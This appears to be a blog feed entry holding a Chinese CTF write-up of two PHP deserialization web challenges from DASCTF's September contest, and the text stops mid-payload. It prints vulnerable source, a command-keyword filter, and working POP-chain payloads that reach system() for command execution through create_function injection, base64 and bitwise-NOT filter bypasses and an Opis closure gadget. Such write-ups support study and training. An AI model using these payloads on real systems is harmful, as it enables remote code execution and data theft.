<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-09T06:57:21.858Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DASCTF九月挑战赛</title>
    <link href="http://example.com/2021/10/09/DASCTF%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://example.com/2021/10/09/DASCTF%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2021-10-09T06:17:12.000Z</published>
    <updated>2021-10-09T06:57:21.858Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="hellounser"><a href="#hellounser" class="headerlink" title="hellounser"></a>hellounser</h3><ul><li>一道php反序列化的题目：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            <span class="variable">$func</span>(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$aaa</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$aaa</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li>照常先来看入口点，在反序列化后立刻函数式调用了该对象，那么可以触发的就是<code>__invoke</code>函数。</li><li><code>__invoke</code>函数内部调用了同类中的<code>show</code>函数，其中将变量<code>$var</code>作为字符串打印，那么可以触发<code>__toString</code>函数。</li><li><code>__toString</code>函数也调用了同类中的<code>show</code>函数，包含了<code>flag.php</code>并且可以控制调用的函数名和第二个参数。</li></ol><ul><li><p>这里我们可以确定使用<code>create_funtion</code>逃逸，使用<code>;&#125;;var_dump(get_defined_vars());//</code>来逃逸出大括号。</p></li><li><p>但是这分别对<code>func</code>和<code>arg</code>做了过滤，那么我们分析如何绕过：</p><ul><li><code>preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $this-&gt;func)</code>，限制不能所有的字符都是字母或者数字，那么我们可以使用<code>\create_function</code>来绕过。而这个<code>\</code>代表该函数是全局空间下的名称。</li><li><code>arg</code>变量限制了很多系统命令和php函数，但是没有限制<code>system</code>函数。过滤了引号，那么我们可以不用引号，只要命令中间没有空格（当然不加引号似乎只在php5生效，我用自己电脑上的php8是不能执行的）。</li></ul></li><li>生成payload：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;\create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;;&#125;;var_dump(get_defined_vars());//&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">var</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A1%3A%22A%22%3A1%3A%7Bs%3A3%3A%22var%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A16%3A%22%5Ccreate_function%22%3Bs%3A3%3A%22arg%22%3Bs%3A34%3A%22%3B%7D%3Bvar_dump%28get_defined_vars%28%29%29%3B%2F%2F%22%3B%7D%7D</span><br></pre></td></tr></table></figure><ul><li>回显：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123; [&quot;func&quot;]=&gt; string(16) &quot;\create_function&quot; [&quot;FakeFlag&quot;]=&gt; string(33) &quot;fl4g&#123;TrueFlag_is_in_Tru3flag.php&#125;&quot; &#125;</span><br></pre></td></tr></table></figure><ul><li>那么我们就需要去查看Tru3flag.php：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public $arg = &#x27;;&#125;;system(ls);//&#x27;;</span><br></pre></td></tr></table></figure><ul><li>回显：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tru3flag.php flag.php index.php</span><br></pre></td></tr></table></figure><ul><li>单词命令是可以执行的，但是<code>cat Tru3flag.php</code>肯定会存在空格，就算将其base64之类的也不行，用引号（这里不让）在本地也失败。所以我们只能再嵌套一层<code>base64_decode</code>函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public $arg = &#x27;;&#125;;system(base64_decode(Y2F0IFRydTNmbGFnLnBocDsg));//&#x27;;</span><br></pre></td></tr></table></figure><ul><li>注意base64编码不能有等号，因为等号也被过滤了，我的方法也很简单，在后面加一个空格就可以了。</li><li>不过base64编码后触发了<code>nl</code>（笑），这里我们用<code>cat Tru*</code>再编码：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public $arg = &#x27;;&#125;;system(base64_decode(Y2F0IFRydSoK));//&#x27;;</span><br></pre></td></tr></table></figure><ul><li>获得flag：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318187.png" alt="image-20211001192729309" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b8b2da7c-260a-41b1-9080-90cafcf9a973&#125;</span><br></pre></td></tr></table></figure><ul><li>当然也可以用取反绕过：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;\create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">var</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$ac</span> = (~(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=Tru3flag.php&#x27;</span>));</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">var</span> -&gt; arg = <span class="string">&#x27;return(1);&#125;require(~(&#x27;</span>.strval(<span class="variable">$ac</span>).<span class="string">&#x27;));//&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h3 id="xxc"><a href="#xxc" class="headerlink" title="xxc"></a>xxc</h3><ul><li>打开网页提示<code>一条链子</code>，使用dirmap扫描到网站源码www.zip，进行代码审计。</li><li>index.php其中存在反序列化操作，这道题确定是一道序列化的题目：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_loader</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;./class/&#x27;</span> . (str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$class</span>) . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">&quot;_loader&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;一条链子&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>我们先来学习一下<code>_loader</code>函数，这是一个自动加载函数，在PHP5中，当我们实例化一个未定义的类时，就会触发此函数。</p></li><li><p><code>spl_autoload_register(&#39;loadprint&#39;)</code>与<code>__autoload</code>函数有异曲同工之妙，PHP碰到没有定义的类就执行<code>loadprint</code>函数。</p></li><li><p>所以我们在<code>index.php</code>中可以自由的实例化存在的类。由于是反序列化的题目，我们先来看看入口点<code>__destruct</code>和<code>__wakeup</code>函数是否存在：</p><ul><li><code>\Control\State\StopHook.php</code>中发现了析构函数，调用了同类中的<code>_exit</code>函数，其中<code>$process-&gt;stop();</code>可能会触发<code>__call</code>函数，而<code>!$process-&gt;isRunning</code>可能会触发<code>__get</code>函数：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StopHook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [<span class="string">&#x27;auto&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$states</span> = [<span class="string">&#x27;started&#x27;</span>, <span class="string">&#x27;running&#x27;</span>, <span class="string">&#x27;finished&#x27;</span>, <span class="string">&#x27;waiting&#x27;</span>, <span class="string">&#x27;fail&#x27;</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$processes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_exit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_exit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<code>\Faker\MyGenerator.php</code>中找到这两个函数，<code>__call</code>函数中<code>echo $this-&gt;defaultCall;</code>一句可能会触发<code>__toString</code>函数：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$defaultValue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$arg_array</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<code>\Method\Func\GetFile.php</code>找到<code>__toString</code>函数，调用了同类中的<code>getFiles</code>函数，发现函数的中调用了<code>isset</code>函数，如果该类中不存在该属性，会触发<code>__isset</code>函数：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getFiles();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;flag) <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        <span class="variable">$s</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;flag-&gt;&#123;<span class="keyword">$this</span>-&gt;value&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span> += <span class="variable">$file</span>-&gt;read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<code>Method\Func\GetDefault.php</code>中找到<code>__isset</code>函数，调用了同类中的<code>popup</code>函数，其中<code>return $s($length);</code>可能会触发<code>__invoke</code>函数：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDefault</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">popup</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span>-&gt;flag != <span class="string">&quot;myTest&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>(<span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$property</span> != <span class="string">&quot;test&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;popup(<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>最后在<code>\Method\Func\GenerateFile.php</code>中找到<code>__invoke</code>函数，且存在<code>call_user_func</code>。没有想到在php5中是可以直接赋值在一个没有初始化的变量上的2333。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenerateFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;myGen(<span class="variable">$param</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myGen</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;buffer-&gt;read;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;source-&gt;generate, <span class="variable">$length</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>整个链子理清楚了，但是发现<code>call_user_func</code>的第二个参数被写死了，因为<code>$this-&gt;popup(666);</code>调用的时候将<code>666</code>传入了<code>__invoke($param)</code>，最后也就作为<code>$length</code>变量传入了<code>myGen($length)</code>函数。</p></li><li><p>现在只能够调用类似<code>phpinfo</code>等不需要参数的函数，并不能够rce，该怎么办呢？</p><ul><li>这时候我们注意到存在<code>function.php</code>，发现这个cms是基于<code>opis/closure</code>搭建的，网址：<a href="https://github.com/opis/closure">https://github.com/opis/closure</a></li><li>该项目是用来闭包类对象的，官方文档：<a href="https://opis.io/closure/3.x/serialize.html。php中的闭包函数（仅对php）即匿名函数，一般是无法进行序列化的，一般会报错：">https://opis.io/closure/3.x/serialize.html。php中的闭包函数（仅对php）即匿名函数，一般是无法进行序列化的，一般会报错：</a></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &#x27;Exception&#x27; with message &#x27;Serialization of &#x27;Closure&#x27; is not allowed&#x27;</span><br></pre></td></tr></table></figure><ul><li>使用这个项目，可以将闭包包装成一个<code>Opis\Closure\SerializableClosure</code>对象，然后使用标准的<code>serialize</code>进行序列化。也可以使用<code>Opis\Closure\serialize</code>函数序列化任意对象。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:32:&quot;Opis\Closure\SerializableClosure&quot;:156:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:33:&quot;function()&#123; 